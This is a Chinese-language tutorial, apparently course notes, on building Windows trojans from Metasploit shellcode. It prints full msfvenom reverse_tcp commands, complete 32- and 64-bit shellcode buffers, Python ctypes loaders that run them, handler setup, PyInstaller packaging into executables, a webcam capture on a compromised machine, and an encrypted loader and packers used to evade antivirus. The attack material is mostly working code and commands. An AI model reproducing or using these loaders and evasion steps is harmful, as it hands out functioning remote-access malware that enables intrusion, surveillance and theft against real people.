[TOC]



# ==利用shellcode生成木马==

教材内容

#### 一、利用Python执行ShellCode

##### 1、支持的源码格式

```
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

##### 2、生成ShellCode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.230.128 LPORT=6666 -f py -o shellcode.py
```

> 这个默认的windows/meterpreter/reverse_tcp模块下的shellcode应该是32位的

生成的内容如下：

```
buf =  b""buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
buf += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
buf += b"\x26\x8b\x72\x28\x31\xff\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
buf += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
buf += b"\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01\xd3\x8b"
buf += b"\x48\x18\x50\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
buf += b"\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38"
buf += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
buf += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
buf += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
buf += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
buf += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
buf += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
buf += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x70"
buf += b"\xd8\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50"
buf += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
buf += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
buf += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
buf += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
buf += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
buf += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
buf += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
buf += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
buf += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
buf += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
buf += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2"
buf += b"\x56\x6a\x00\x53\xff\xd5"
```

##### 3、编写32位Python加载器

```python
import ctypes

buf =  b""
buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
buf += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
buf += b"\x26\x8b\x72\x28\x31\xff\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
buf += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
buf += b"\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01\xd3\x8b"
buf += b"\x48\x18\x50\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
buf += b"\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38"
buf += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
buf += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
buf += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
buf += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
buf += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
buf += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
buf += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x70"
buf += b"\xd8\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50"
buf += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
buf += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
buf += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
buf += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
buf += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
buf += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
buf += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
buf += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
buf += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
buf += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
buf += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2"
buf += b"\x56\x6a\x00\x53\xff\xd5"
shellcode=bytearray(buf)
ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
handle = ctypes.windll.kernel32.CreateThread(    
    ctypes.c_int(0),    
    ctypes.c_int(0),    
    ctypes.c_int(ptr),    
    ctypes.c_int(0),    
    ctypes.c_int(0),    
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

##### 4、MSF监听实现反弹

```
msf6 > use exploit/multi/handler

[*] Using configured payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set lhost 192.168.230.128
lhost => 192.168.230.128

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.230.128:6666 
[*] Sending stage (175686 bytes) to 192.168.230.1

[*] Meterpreter session 8 opened (192.168.230.128:6666 -> 192.168.230.1:52594) at 2023-04-25 00:23:16 +0800

meterpreter >
```

##### 5、利用Pyinstaller打包Python代码为可执行程序

`pip install PyInstaller`

```
pyinstaller -F -w pyshell.py
```

在生成的目录下找到pyshell.exe，实现与MSF的连接。（通常此时杀毒软件会预警）。

> 使用Java加载Java版本的ShellCode：https://www.4hou.com/index.php/posts/j6xW

#### 二、使用Python 64位版加载器

##### 1、生成x64位的ShellCode

msf6 提示符下运行以下代码，注意 set -p payload 的设置要与 opitons 中的 payload 一样

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.230.128 LPORT=6666 -f py -o shellcode_64.py
```

![](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921215014392.png)

打开 shellcode_64.py

```
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7"
buf += b"\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b\x42\x3c"
buf += b"\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
buf += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b"
buf += b"\x40\x20\x50\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48"
buf += b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0"
buf += b"\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
buf += b"\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49"
buf += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
buf += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
buf += b"\x49\xbc\x02\x00\x1a\x0a\xc0\xa8\xe6\x80\x41\x54"
buf += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
buf += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
buf += b"\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50"
buf += b"\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
buf += b"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf"
buf += b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
buf += b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
buf += b"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00"
buf += b"\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
buf += b"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8"
buf += b"\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20"
buf += b"\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00"
buf += b"\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4"
buf += b"\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
buf += b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba"
buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
buf += b"\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00"
buf += b"\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41"
buf += b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
buf += b"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6"
buf += b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
buf += b"\xf0\xb5\xa2\x56\xff\xd5"
```

##### 2、使用64位版Python加载器

```
import ctypes

buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51".... ShellCode略 ....

ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))

handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)

ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

##### 3、kali use /exploit/multi/handler 模块开启监听

> 使用 /exploit/multi/handler 监听模块时，对 64 位的shellcode打包的程序进行监听时需要更改 options 中的 payload 
>
> ```
> set payload windows/x64/meterpreter/reverse_tcp
> ```
>
> ![image-20240921215711721](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921215711721.png)

![image-20240921215848840](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921215848840.png)

##### 4、运行第二步构造的 shellcode_64.py

![image-20240921215940337](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921215940337.png)

![image-20240921220044461](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921220044461.png)

**直接运行 shellcode_64.py 木马上线成功** 

##### 5、在64位的Python环境安装PyInstaller，同样可以生成exe文件。

> 那么只要用户运行 exe 文件，木马就可以上线，并且不需要用户拥有 python 环境，因为打包的过程就会将该程序源代码运行所需要的最小的环境结合起来，类似于一个最小化的针对于该程序源代码的最小化python环境

> 上述加载器代码更加简洁，但是无论怎样的ShellCode，或是生成exe木马，均无法过杀毒软件，所以需要免杀。

`pip install PyInstaller`

```
pyinstaller -F -w shellcode_64.py
pyinstaller -Fw shellcode_64.py
```

![image-20240921220756624](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921220756624.png)

在 dist 目录下存在 exe 文件

![image-20240921220928383](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921220928383.png)

双击运行该可执行文件，即可木马上线

![image-20240921221050453](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921221050453.png)

将 shellcode_64.exe 放在Windows server 的虚拟机中也可以上线

![image-20240921221246765](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921221246765.png)

![image-20240921221308417](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921221308417.png)

> 让物理机木马上线执行一下 拍照（meterpreter 的用法） 看看可不可行
>
> `webcam_snap -i 1 -v false`
>
> ![image-20240921223616998](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921223616998.png)
>
> ![image-20240921223602736](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921223602736.png)
>
> **牛逼**

#### 三、Python加载器实现免杀

1、Python编码实现

https://www.cnblogs.com/f-carey/p/16577962.html

https://forum.butian.net/share/1690

2、ShellCode Loader

（1）下载：https://github.com/Axx8/ShellCode_Loader

（2）安装Python和PyInstaller，安装Pycrypto：pycryptodome，另外，本实验需要Python 64位环境，最好使用最新版

```
pip install pycryptodome
```

（3）进入Python插件目录：\Python311\Lib\site-packages 将目录 crypto 修改为大写开头：Crypto

（4）利用MSF或CobaltStrike生成C语言的ShellCode，如使用以下msfvenom命令生成：

```
msfvenom -e x64/xor_dynamic -p windows/x64/meterpreter/reverse_tcp lhost=192.168.230.128 lport=6666 -f c -o shellcode_xor.c
```

或直接使用CobaltStrike生成也可以。

![image-20240921230013896](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921230013896.png)

（5）运行：Shellcode_encryption.exe payload.c 对ShellCode代码进行加密处理

- 将 msfvenom 生成得到的 shellcode_xor.c 文件 复制到 ShellCode_Loader-main 目录下，并使用 Shellcode_encryption.exe 对 shellcode_xor.c 文件进行加密
- ![image-20240921230407147](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921230407147.png)

```
H:\NetSecureTools\ShellCode_Loader-main>Shellcode_encryption.exe shellcode_xor.c

注意：
   该项目仅供网络安全研究使用，禁止使用该项目进行违法操作，否则自行承担后果，请各位遵守《中华人民共和国网络安全法》

项目地址:
   https://github.com/Axx8/ShellCode_Loader

密文Shellcode:  vHLVRAPpxZBVILpa6Ihzzf3Iy6l6aEdFAmgtJ4olNnHp89u49Tn6+329YgM/cZjQHodRraPO+sRaXaPwmnjyX4iN6BaHz2SaBSemKJDUfueGnPdGoCd7vH6da1VIwMWmeh7MD+8+nG5AmdctLxgVeG78l6uUW2Z8qRNcjzM/WR5eGKDDcWf30OYoldr28Q6ZDnmGyDl/zS/K0Feu3nLkCtpysC+aLT/2sL4qBTNgtrJkg6JPkKnH1NdqS7+SZUSsmRSf1DbrEdSNpj5rPLG/5+SRNjuD0ULVQI//Xe8MxxDWfqAYRQKQordjlFK/2Z4aty2YdTTb4MYEb7BqWeHNnhV/F+rnpi24lXOpy/yyNBX/4LasFMd3IUia+lFwkCQzy9+lhEmErJTwk6Hxe5WpAhsFYlG4KJUdwaDwNsuXl8Qd4lEzajgeJ5QhT+cExAk6cN/dCmYngNGt6bX7xyWbKLdHykOUezmn/6j3Np3Xq94bhBcBPAoeP+QWVDsTTIFkXDc9FLXUIwQw1zxhpIHDx4PtIvI0CFKum9ug00ZZLBUdAMZ/CeMBLd11hdvYhRmYcstAK4SOXlT4kf+ZR3hBFQsb9qTUNC6vA7PEnBkgTxsNNaK9dzwQXK4l7tLhD1nHC6+eJbxpIUYzbUeCqXdSTocseUNN+RriRI7n+ZnRf7Orw52UYjmBtDMj/Nz1zxhqzHWf58zokv27nXdAQP1hqDCyu9BbZgwPUvGJFBc19gMAeysAvoYI5em1TCROAFIeqCDMf99+4lg9AKuMgRcOttMKUdaemjK8z61jXvLSlDzD7OcBvPrg443/Uidrua39494QAuuEEJ27XEwZI/u3ytkLr8bHiJrxH9x5PYuvwANT1vglW/x6rk5gjsrFktsEIA8/7YLWsEsg+S5AxxKEx9AWa5JBSk9uu5zwWeff834rpKo2aAO9lPDWqixLvlnXNd33z0I9Xgi+Fcf30rwWNsNe7jtaXDc/DkEpWBwEHG4=
```

（6）将生成的密文ShellCode 填至 ShellCode_Loader.py 里的 Data = ‘密文Shellcode’ 处

![image-20240921230448405](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921230448405.png)

（7）msf开启 run 运行ShellCode_Loader.py，确认MSF或CobaltStrike是否上线

![image-20240921230714448](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921230714448.png)

![image-20240921230752137](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921230752137.png)

![image-20240921230834798](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921230834798.png)

**木马上线成功**

> 或者直接在命令行中运行 ShellCode_Loader.py 也可以实现木马上线
>
> ![image-20240921231109889](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921231109889.png)

（8）利用PyInstaller生成可执行程序，利用杀毒软件进行检测，火绒目前不免杀，但是360免杀

![image-20240921231531567](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921231531567.png)

![image-20240921231545565](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921231545565.png)

**木马测试上线成功**

#### 四、加壳程序实现免杀

压缩壳：upx,aspack ,fsg ,pecompach

加密壳：ASProtect ,Armadillo（穿山甲）,EXEcryptor,Themida,ZProtect

虚拟机壳：VMProtect

